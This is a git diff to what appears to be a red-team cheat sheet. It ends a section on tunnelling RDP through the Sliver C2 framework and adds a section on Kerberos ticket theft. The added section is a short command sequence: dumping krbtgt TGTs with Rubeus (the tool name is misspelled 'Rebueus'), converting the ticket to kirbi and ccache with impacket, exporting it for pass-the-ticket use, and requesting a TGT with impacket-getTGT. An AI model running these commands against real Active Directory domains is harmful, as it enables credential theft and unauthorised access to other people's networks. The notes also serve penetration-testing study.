@@ -429,3 +429,29 @@ To use the Sliver C2 framework to create a tunnel that proxies an RDP session, y
    - **Security Measures:** Ensure you have the appropriate authorization to perform these actions, as tunneling into a system without permission is illegal and unethical.
 
 This setup enables you to proxy an RDP session through Sliver, allowing remote access and control of the target system via the RDP protocol.
+
+
+### Rubeus and getting a TGT
+
+```bash
+Rebueus dump /service:krbtgt /nowrap
+```
+
+- Copy b64 ticket to a file
+- Convert b64 to .kirbi
+```bash
+base64 -d ticket.b64 > ticket.kirbi
+```
+- Convert to ccache format
+```bash
+impacket-ticketConverter ticket.kirbi ticket.ccache
+```
+- export ticket
+```bash
+export KRB5CCNAME=<path to ticket.ccache>
+```
+
+*Alternate way:*
+```bash
+impacket-getTGT <domain>/<user>:<password>
+```
